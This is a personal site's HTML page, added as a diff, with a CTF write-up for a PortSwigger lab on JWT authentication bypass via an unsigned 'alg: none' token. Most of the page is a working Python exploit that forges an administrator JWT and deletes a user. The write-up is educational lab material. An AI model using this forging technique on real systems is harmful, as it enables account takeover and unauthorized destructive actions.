@@ -1,0 +1,261 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <!-- Google tag (gtag.js) -->
+    <script async src="https://www.googletagmanager.com/gtag/js?id=G-45Z0Y6HPDS"></script>
+    <script>
+        window.dataLayer = window.dataLayer || [];
+        function gtag() { dataLayer.push(arguments); }
+        gtag('js', new Date());
+
+        gtag('config', 'G-45Z0Y6HPDS');
+    </script>
+    <!-- Basic Meta Tags -->
+    <meta name="title" content="Shubham Ranpise | Cyber Security Researcher">
+    <meta name="description" content="Explore real-world CTF solutions from PortSwigger, JWT, IDOR, SSRF, and more.">
+
+    <!-- Open Graph (Facebook/LinkedIn) -->
+    <meta property="og:type" content="website">
+    <meta property="og:url" content="https://shubhamranpise.com/">
+    <meta property="og:title" content="Shubham Ranpise | Cyber Security Researcher">
+    <meta property="og:description"
+        content="Cyber Security Researcher. Explore my labs, projects, blog, custom exploits for CTF, and more.">
+    <meta property="og:image" content="https://shubhamranpise.com/assets/og-image.jpg">
+
+    <!-- Twitter Card -->
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:title" content="Shubham Ranpise | Cyber Security Researcher">
+    <meta name="twitter:description"
+        content="Cyber Security Researcher. Explore my labs, projects, blog, custom exploits for CTF, and more.">
+    <meta name="twitter:image" content="https://shubhamranpise.com/assets/og-image.jpg">
+
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <link rel="icon" type="image/png" href="./../../../assets/favicon.png" />
+    <title>JWT Authentication Bypass via Unverified Signature | Shubham Ranpise</title>
+    <link rel="stylesheet" href="./../../../static/css/style.css" />
+    <link rel="stylesheet" href="./../../../static/css/mediaqueries.css" />
+
+    <script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "Person",
+  "name": "Shubham Ranpise",
+  "url": "https://shubhamranpise.com/",
+  "jobTitle": "Cyber Security Researcher",
+  "sameAs": [
+    "https://github.com/ShubhamNR007",
+    "https://www.linkedin.com/in/shubham-ranpise/"
+  ]
+}
+</script>
+
+</head>
+
+<body>
+    <header>
+        <nav id="desktop-nav">
+            <div class="logo">
+                <a href="./../../../index.html" class="logo-wrapper">
+                    <img src="./../../../assets/home_light.png" src-light="./../../../assets/home_light.png"
+                        src-dark="./../../../assets/home_dark.png" alt="Home Logo" class="icon logo-icon" />
+                    <span>Shubham</span>
+                </a>
+            </div>
+
+            <div>
+                <ul class="nav-links">
+                    <li><a href="./../../../ctf/ctf.html" class="active">CTF</a></li>
+                    <li><a href="./../../../notes/notes.html">Notes</a></li>
+                    <li><a href="./../../../about/about.html">About</a></li>
+                    <li>
+                        <img id="modeToggle" class="icon color-icon" src="./../../../assets/theme_light.png"
+                            src-light="./../../../assets/theme_light.png" src-dark="./../../../assets/theme_dark.png"
+                            alt="Color theme icon" />
+                    </li>
+                </ul>
+            </div>
+        </nav>
+    </header>
+
+    <nav id="hamburger-nav">
+        <div class="logo">
+            <a href="./../../../index.html" class="logo-wrapper">
+                <img src="./../../../assets/home_light.png" src-light="./../../../assets/home_light.png"
+                    src-dark="./../../../assets/home_dark.png" alt="Home Logo" class="icon logo-icon" />
+                <span>Shubham</span>
+            </a>
+        </div>
+        <div class="hamburger-menu">
+            <div class="hamburger-icon" onclick="toggleMenu()">
+                <span></span>
+                <span></span>
+                <span></span>
+            </div>
+            <div class="menu-links">
+                <li><a href="./../../../ctf/ctf.html" class="active">CTF</a></li>
+                <li><a href="./../../../notes/notes.html">Notes</a></li>
+                <li><a href="./../../../about/about.html">About</a></li>
+                <li>
+                    <img id="modeToggle2" class="icon color-icon" src="./../../../assets/theme_light.png"
+                        src-light="./../../../assets/theme_light.png" src-dark="./../../../assets/theme_dark.png"
+                        alt="Color theme icon" />
+                </li>
+            </div>
+        </div>
+    </nav>
+
+
+
+
+    <section id="ctf">
+        <h2 class="lab-heading">JWT Authentication Bypass via Unverified Signature</h2>
+        <div class="lab-section">
+                <h3 class="lab-subheading">📚 What I Learned</h3>
+                <p>While playing with JWTs, I found a scenario where the server accepts tokens with &quot;alg&quot;:
+                    &quot;none&quot;,
+                    which basically means no signature at all. That’s a massive security flaw. I could forge my own
+                    token and the server blindly trusted it — this let me switch identities to administrator and
+                    perform privileged actions. It was an eye-opener on why skipping JWT validation is catastrophic.</p>
+               
+                <h3 class="lab-subheading">⚙️ How to Run the Exploit</h3>
+                <p>
+                    [+] Start Burp Suite before running the script — it uses a proxy for visibility.<br>
+                    [+] The script logs in as wiener to capture a real JWT and extracts the kid value.<br>
+                    [+] It then crafts a JWT with &quot;alg&quot;: &quot;none&quot; and updates the sub field to
+                    administrator.<br>
+                    [+] This forged token is used to send a request that deletes the target user.<br>
+                    [+] Check the Burp history to follow how the JWT was modified and used.</p>
+                
+                <h3 class="lab-subheading">🖥️ Command to Run</h3>
+<div class="code-block-wrapper">
+<pre><code>python3 exploit.py https://&lt;your-lab-id&gt;.web-security-academy.net
+</code></pre>
+<div class="floating-code-buttons">
+    <button class="copy-btn">📋</button>
+    <button class="download-btn">⬇️</button>
+</div>
+                
+</div>
+
+<br>
+<div class="code-block-wrapper">
+<pre><code>import requests
+import base64
+import json
+import sys
+import urllib3
+from bs4 import BeautifulSoup
+
+# Disable SSL warnings
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+                        
+# Set Burp proxy
+proxies = {
+&#x27;http&#x27;: &#x27;http://127.0.0.1:8080&#x27;,
+&#x27;https&#x27;: &#x27;http://127.0.0.1:8080&#x27;
+}
+
+# Base64 encode JSON without padding
+def b64encode(data):
+    return base64.urlsafe_b64encode(json.dumps(data).encode()).decode().rstrip(&#x27;=&#x27;)
+
+# Get CSRF token from login page
+def get_csrf_token(s, url):
+    r = s.get(url + &quot;/login&quot;, verify=False, proxies=proxies)
+    soup = BeautifulSoup(r.text, &quot;html.parser&quot;)
+    token = soup.find(&quot;input&quot;, {&quot;name&quot;: &quot;csrf&quot;})[&quot;value&quot;]
+    return token
+
+# Log in and extract session JWT
+def login_and_get_jwt(s, url, username, password):
+    csrf = get_csrf_token(s, url)
+    data = {
+        &quot;csrf&quot;: csrf,
+        &quot;username&quot;: username,
+        &quot;password&quot;: password
+    }
+
+    r = s.post(url + &quot;/login&quot;, data=data, verify=False, proxies=proxies, allow_redirects=False)
+    
+    if &quot;session&quot; not in r.cookies:
+        print(&quot;[-] Login failed or JWT cookie not found.&quot;)
+        sys.exit(1)
+
+    return r.cookies.get(&quot;session&quot;)
+
+# Forge new JWT with alg: none and sub: administrator
+def forge_jwt(original_jwt):
+    # Decode original JWT (split into header, payload, signature)
+    parts = original_jwt.split(&#x27;.&#x27;)
+    if len(parts) != 3:
+        print(&quot;[-] Invalid JWT format.&quot;)
+        sys.exit(1)
+
+    # Decode payload and modify &#x27;sub&#x27;
+    payload = json.loads(base64.urlsafe_b64decode(parts[1] + &quot;==&quot;).decode())
+    payload[&#x27;sub&#x27;] = &#x27;administrator&#x27;
+
+    # Create new header
+    header = {&quot;alg&quot;: &quot;none&quot;}
+
+    # Forge unsigned JWT
+    forged = b64encode(header) + &quot;.&quot; + b64encode(payload) + &quot;.&quot;
+    return forged
+
+# Use the forged token to delete a target user
+def delete_user(s, url, token, target_user):
+    uri = f&quot;/admin/delete?username={target_user}&quot;
+    headers = {
+        &quot;User-Agent&quot;: &quot;Mozilla/5.0&quot;,
+        &quot;Referer&quot;: f&quot;{url}/admin&quot;
+    }
+    cookies = {&quot;session&quot;: token}
+
+    r = s.get(url + uri, headers=headers, cookies=cookies, verify=False, proxies=proxies)
+
+    if &quot;User deleted successfully&quot; in r.text or r.status_code == 200:
+        print(f&quot;[+] User &#x27;{target_user}&#x27; deleted successfully.&quot;)
+    else:
+        print(f&quot;[-] Failed to delete user &#x27;{target_user}&#x27;.&quot;)
+        print(r.text)
+
+ # Main script
+if __name__ == &quot;__main__&quot;:
+    try:
+         url = sys.argv[1].strip().rstrip(&quot;/&quot;)
+    except IndexError:
+        print(f&quot;[-] Usage: {sys.argv[0]} &lt;url&gt;&quot;)
+        sys.exit(1)
+
+    session = requests.Session()
+
+    # Step 1: Login as &#x27;wiener&#x27; and get original JWT
+    original_jwt = login_and_get_jwt(session, url, &quot;wiener&quot;, &quot;peter&quot;)
+    print(f&quot;[+] Original JWT: {original_jwt}&quot;)
+
+    # Step 2: Forge JWT with admin privileges
+    forged_token = forge_jwt(original_jwt)
+    print(f&quot;[+] Forged JWT: {forged_token}&quot;)
+
+    # Step 3: Use forged token to delete &#x27;carlos&#x27;
+    delete_user(session, url, forged_token, &quot;carlos&quot;)
+</code></pre>
+<div class="floating-code-buttons">
+    <button class="copy-btn">📋</button>
+    <button class="download-btn">⬇️</button>
+</div>
+
+</div>
+</section>
+
+    <footer>
+        <p>Copyright © 2025 Shubham Ranpise.</p>
+    </footer>
+
+    <script src="./../../../static/js/main.js"></script>
+</body>
+
+</html>
